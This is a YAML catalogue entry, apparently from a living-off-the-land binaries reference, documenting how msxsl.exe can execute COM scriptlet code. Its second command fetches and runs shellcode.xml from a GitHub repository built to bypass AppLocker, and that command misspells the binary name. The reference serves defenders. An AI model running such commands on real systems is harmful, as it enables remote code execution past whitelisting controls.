---
Name: msxsl.exe
Description: Execute
Author: ''
Created: '2018-05-25'
Categories: []
Commands:
  - Command: msxsl.exe customers.xml script.xsl
    Description: Run COM Scriptlet code within the script.xsl file (local).
  - Command: msxls.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml
    Description: Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
Full Path:
  - N/A
Code Sample: []
Detection: []
Resources:
  - https://twitter.com/subTee/status/877616321747271680
  - https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker
Notes: Thanks to Casey Smith - @subTee (Finding), 3gstudent - @3gstudent (Remote)
---